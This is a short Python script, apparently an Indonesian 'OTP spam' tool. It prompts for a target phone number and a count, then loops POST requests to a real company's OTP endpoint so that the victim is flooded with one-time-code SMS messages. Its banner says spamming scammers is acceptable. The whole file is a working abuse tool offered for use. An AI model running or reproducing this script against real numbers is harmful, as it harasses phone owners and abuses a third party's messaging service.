import json
import os
from subprocess import call
from urllib import request
#code warna
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
os.system ("")
call(
	'clear'
)
print("""
	\033[33;1m✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪
	\033[33;1m= \033[36;1mAuthor : RAMADHANI\033[33;1m  =
	\033[33;1m= \033[36;1mGithub : RAMA-XD\033[33;1m    =
        \033[33;1m✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪
	      \033[31;1mBy : RAMADHANI 
	\033[34;1m=======================
	\033[32;1m# Jan Buat Nyepam Orang Yg Gak Salah !
	\033[32;1m# Nyepam Penipu ? Boleh  
	\033[32;1m# Script Ini 100% Gratis 
		"""
)
print(
    '\033[34;1mCONTOH    : 0895xxxxxx'
)
nomor=input(
	'\033[36;1mNO TARGET : '
)

while True:
	try:
		mex=int(
					input(
				'\033[33;1mJUMLAH SPAM OTP ? : '
			)
		)
		print(),;break
	except : continue
		
for max in range(mex):
	req = request.Request(
		'https://www.nutriclub.co.id/otp/?phone='+nomor+'&old_phone='+nomor, method="POST"
	)
	r = json.loads(
				request.urlopen(
					req
				).read(
			)
		)
	if r['StatusCode']=='00':
		print(
					'['+str(
				max+1
			).zfill(2)+']'+' SPAM BERHASIL KE NOMOR '+nomor[0:6]+'xxxx'
		)
	else:
		print(
					'['+str(
				max+1
			).zfill(2)+']'+' GAGAL SPAM KE NOMOR'+nomor[0:6]+'xxxx'
		)
	__import__(
				"time"
			).sleep(
		2
	)